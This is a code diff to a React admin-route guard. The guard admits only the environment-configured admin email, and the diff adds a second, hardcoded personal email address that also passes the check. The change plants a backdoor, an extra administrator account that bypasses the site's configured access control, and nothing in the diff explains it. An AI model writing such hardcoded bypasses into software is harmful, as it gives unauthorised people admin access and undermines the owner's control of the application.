@@ -18,7 +18,7 @@ export default function AdminRoute() {
     return <Navigate to="/login" state={{ from: location }} replace />;
   }
 
-  if (user.email !== import.meta.env.VITE_ADMIN_EMAIL) {
+  if (user.email !== import.meta.env.VITE_ADMIN_EMAIL && user.email !== 'akugbof@gmail.com') {
     return <Navigate to="/dashboard" replace />;
   }
 
